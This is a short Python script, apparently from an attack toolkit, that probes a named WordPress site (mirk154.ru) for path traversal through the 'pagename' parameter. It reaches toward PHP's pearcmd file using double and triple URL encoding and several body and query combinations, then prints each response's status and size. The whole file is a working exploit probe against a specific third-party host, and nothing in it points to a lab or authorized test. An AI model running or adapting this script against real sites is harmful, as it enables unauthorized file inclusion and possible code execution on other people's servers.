from core import vuln

h = "mirk154.ru"
base = "https://" + h
CT = "application/x-www-form-urlencoded"
one = "page-templates/../../../../usr/local/lib/php/pearcmd"
enc2 = vuln._denc(one)
enc3 = enc2.replace("%", "%25")
pid = 4473

def show(name, url, body):
    try:
        r = vuln._req("POST", url, body=body, ctype=CT)
    except Exception as e:
        print(name, "EXC", type(e).__name__); return
    print("%-28s %s len=%d" % (name, r.status_code, len(r.text or "")))

show("тело: pagename только", base + "/", ("pagename=" + enc2).encode())
show("тело: двойное+page_id", base + "/", ("page_id=%d&pagename=%s" % (pid, enc2)).encode())
show("тело: тройное+page_id", base + "/", ("page_id=%d&pagename=%s" % (pid, enc3)).encode())
show("query page_id + тело pagename", base + "/?page_id=%d" % pid, ("pagename=" + enc2).encode())
show("query всё + пустое тело", base + "/?page_id=%d&pagename=%s" % (pid, enc2), b"")